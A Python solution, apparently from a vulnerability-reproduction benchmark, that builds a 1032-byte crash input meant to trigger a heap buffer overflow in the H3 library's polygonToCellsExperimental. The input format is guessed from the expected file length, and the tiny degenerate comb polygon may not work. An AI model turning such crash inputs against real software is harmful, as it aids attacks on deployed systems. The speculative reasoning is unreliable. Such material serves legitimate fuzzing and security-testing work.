import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in polygonToCellsExperimental.

        The vulnerability is a heap buffer overflow due to under-estimation of the
        number of cells required to fill a polygon. This typically occurs with
        polygons that have a high perimeter-to-area ratio, such as long, thin,
        or convoluted shapes, as they can cross many cell boundaries while
        enclosing a very small area.

        Based on the ground-truth PoC length of 1032 bytes, we can infer the
        likely input format. A common format for fuzzing geometry functions is:
        - int32: number of loops in the polygon
        - int32: number of vertices in the first loop
        - A sequence of (latitude, longitude) pairs as doubles (8 bytes each)

        Total size = 4 (num_loops) + 4 (num_vertices) + num_vertices * 16
        If total size is 1032:
        1032 = 8 + num_vertices * 16
        1024 = num_vertices * 16
        num_vertices = 64

        Therefore, the PoC will consist of a single-loop polygon with 64 vertices.
        We will construct a "comb" or "sawtooth" shape to maximize the number of
        cell boundary crossings.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        num_loops = 1
        num_vertices = 64

        # The fuzzer likely reads data in little-endian format.
        # Pack the header: 1 loop with 64 vertices.
        # Format: <i (4 bytes), <i (4 bytes)
        poc = bytearray(struct.pack('<ii', num_loops, num_vertices))

        # Generate vertices for a convoluted "comb" shape.
        # This shape is designed to maximize intersections with the H3 grid cells.
        base_lat = 0.0
        base_lon = 0.0
        # A very small delta creates a fine-grained, jagged polygon that is
        # likely to trigger an underestimation in the cell count calculation.
        delta = 1e-9

        vertices = []
        # Create 32 "teeth" for the comb, using 64 vertices in total.
        for i in range(num_vertices // 2):
            # Vertex on the "base" of the comb
            lat1 = base_lat
            lon1 = base_lon + i * delta
            vertices.append((lat1, lon1))

            # Vertex on the "tip" of the comb tooth
            lat2 = base_lat + delta
            lon2 = base_lon + i * delta
            vertices.append((lat2, lon2))
        
        # Pack the vertex coordinates as pairs of little-endian doubles.
        # Format: <d (8 bytes), <d (8 bytes) for each vertex pair.
        for lat, lon in vertices:
            poc.extend(struct.pack('<dd', lat, lon))
            
        # The final PoC size will be 4 + 4 + 64 * 16 = 1032 bytes.
        return bytes(poc)
